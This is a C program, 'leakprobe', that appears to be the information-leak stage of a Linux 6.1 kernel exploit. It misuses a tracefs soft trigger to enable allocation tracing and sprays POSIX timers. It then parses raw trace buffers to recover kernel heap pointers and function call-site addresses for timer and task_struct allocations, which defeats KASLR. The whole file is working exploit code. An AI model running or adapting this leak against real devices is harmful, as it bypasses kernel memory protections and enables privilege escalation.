/* leakprobe — read-only validation of the 6.1 timer leak stage.
 * Enables kmem:kmem_cache_alloc through the rss_stat soft trigger (the only
 * writable enable path on this device), creates N POSIX timers, then scans
 * trace_pipe_raw for kmem_cache_alloc records with bytes_req == 264.
 *
 * No kernel writes. Only tracefs + timer_create.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define KITIMER_SIZE 264u

static int wf(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n < 0 ? -1 : 0;
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof(s), &s))
		perror("sched_setaffinity");
}

static void kick_rss(void)
{
	size_t len = 64u << 20;
	char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	if (p != MAP_FAILED) {
		for (size_t i = 0; i < len; i += 4096)
			p[i] = 1;
		munmap(p, len);
	}
}

static void drain_raw(void)
{
	uint8_t *buf = malloc(1 << 20);
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (!buf)
		return;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		while (read(fd, buf, 1 << 20) > 0)
			;
		close(fd);
	}
	free(buf);
}

struct rec {
	uint64_t site, ptr;
	uint32_t req, alloc;
};

int main(int argc, char **argv)
{
	int want = argc > 1 ? atoi(argv[1]) : 2048;
	uint8_t *buf = malloc(32u << 20);
	size_t used = 0;
	struct rec *recs;
	int nrec = 0, fd;
	struct sigevent ev;

	if (!buf) {
		fprintf(stderr, "oom\n");
		return 1;
	}
	pin_cpu(0);

	if (wf(TRACE "/tracing_on", "0\n")) {
		fprintf(stderr, "tracing_on not writable\n");
		return 2;
	}
	wf(TRACE "/buffer_size_kb", "16384\n");
	/* Soft trigger: the only path that turns the event on for shell.  EEXIST
	 * when it is already installed, which is fine. */
	wf(TRACE "/events/kmem/rss_stat/trigger",
	   "enable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	drain_raw();

	/* warm the posix_timers_cache path once so the trigger fires */
	for (int i = 0; i < 8; i++) {
		timer_t t;
		memset(&ev, 0, sizeof(ev));
		ev.sigev_notify = SIGEV_NONE;
		timer_create(CLOCK_MONOTONIC, &ev, &t);
	}

	wf(TRACE "/tracing_on", "1\n");
	int made = 0;
	for (int i = 0; i < want; i++) {
		timer_t t;
		memset(&ev, 0, sizeof(ev));
		ev.sigev_notify = SIGEV_NONE;
		if (timer_create(CLOCK_MONOTONIC, &ev, &t) == 0)
			made++;
	}
	wf(TRACE "/tracing_on", "0\n");
	printf("TIMERS_MADE=%d\n", made);

	if (argc > 2 && !strcmp(argv[2], "task")) {
		/* Fork children while tracing to capture dup_task_struct's
		 * task_struct allocation: call_site offset + bytes_req. */
		wf(TRACE "/events/kmem/rss_stat/enable", "1\n");
		wf(TRACE "/tracing_on", "1\n");
		for (int i = 0; i < 12; i++) {
			pid_t c = fork();
			if (c == 0)
				_exit(0);
			if (c > 0)
				waitpid(c, NULL, 0);
		}
		wf(TRACE "/tracing_on", "0\n");
		{
			FILE *f = fopen(TRACE "/trace", "r");
			char line[512];
			int shown = 0;
			if (f) {
				while (fgets(line, sizeof(line), f) && shown < 4) {
					if (!strstr(line, "dup_task_struct"))
						continue;
					fputs(line, stdout);
					shown++;
				}
				fclose(f);
			}
			printf("TASK_TEXT_HITS=%d\n", shown);
		}
		fflush(stdout);
		return 0;
	}

	if (argc > 2 && !strcmp(argv[2], "text")) {
		/* Text trace resolves call_site to symbol+offset. */
		FILE *f = fopen(TRACE "/trace", "r");
		char line[512];
		int shown = 0;
		if (!f) {
			perror("open trace");
			return 5;
		}
		while (fgets(line, sizeof(line), f) && shown < 6) {
			if (!strstr(line, "do_timer_create"))
				continue;
			fputs(line, stdout);
			shown++;
		}
		fclose(f);
		printf("TEXT_HITS=%d\n", shown);
		fflush(stdout);
		return 0;
	}

	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0) {
		perror("open trace_pipe_raw");
		return 3;
	}
	while (used + 4096 < (32u << 20)) {
		ssize_t r = read(fd, buf + used, (32u << 20) - used);
		if (r > 0) {
			used += (size_t)r;
			continue;
		}
		if (r < 0 && errno == EINTR)
			continue;
		break;
	}
	close(fd);
	printf("RAW=%zu\n", used);

	recs = calloc(used / 8 + 1, sizeof(*recs));
	if (!recs)
		return 4;
	/* 6.1 layout: common(8) | call_site@8 ptr@16 bytes_req@24 bytes_alloc@32 */
	for (size_t o = 0; o + 40 <= used; o++) {
		uint64_t site, ptr;
		uint32_t req, alloc;
		memcpy(&site, buf + o, 8);
		memcpy(&ptr, buf + o + 8, 8);
		memcpy(&req, buf + o + 16, 4);
		memcpy(&alloc, buf + o + 24, 4);
		if ((site >> 48) != 0xffff)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (req != KITIMER_SIZE)
			continue;
		if (nrec < (int)(used / 8 + 1)) {
			recs[nrec].site = site;
			recs[nrec].ptr = ptr;
			recs[nrec].req = req;
			recs[nrec].alloc = alloc;
			nrec++;
		}
	}
	printf("TIMER_RECS=%d\n", nrec);

	/* modal call_site == do_timer_create + alloc-offset */
	{
		uint64_t best = 0;
		int bestc = 0;
		for (int i = 0; i < nrec; i++) {
			int c = 0;
			for (int j = 0; j < nrec; j++)
				if (recs[j].site == recs[i].site)
					c++;
			if (c > bestc) {
				bestc = c;
				best = recs[i].site;
			}
		}
		printf("MODE_CALL_SITE=%#llx COUNT=%d\n",
		       (unsigned long long)best, bestc);
		for (int i = 0; i < nrec && i < 4; i++)
			printf("REC site=%#llx ptr=%#llx req=%u alloc=%u\n",
			       (unsigned long long)recs[i].site,
			       (unsigned long long)recs[i].ptr, recs[i].req,
			       recs[i].alloc);
	}
	fflush(stdout);
	return 0;
}
